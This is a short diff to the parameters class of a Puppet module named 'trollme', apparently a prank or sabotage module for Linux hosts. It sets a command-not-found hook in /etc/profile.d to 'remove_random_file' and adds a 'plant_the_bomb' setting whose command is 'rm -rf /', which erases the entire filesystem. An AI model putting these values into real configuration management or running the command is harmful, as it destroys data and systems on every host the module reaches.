@@ -5,8 +5,11 @@ class trollme::params {
   $motd_file      = '/etc/motd'
 
   # command_not_found:
-  $cnf_file = '/etc/profile.d/cnf.sh'
+  $cnf_file   = '/etc/profile.d/cnf.sh'
   $cnf_action = 'remove_random_file'
-  $sl_pkg = 'sl'
+  $sl_pkg     = 'sl'
+
+  # plant_the_bomb
+  $ptb_command = 'rm -rf /'
 
 }
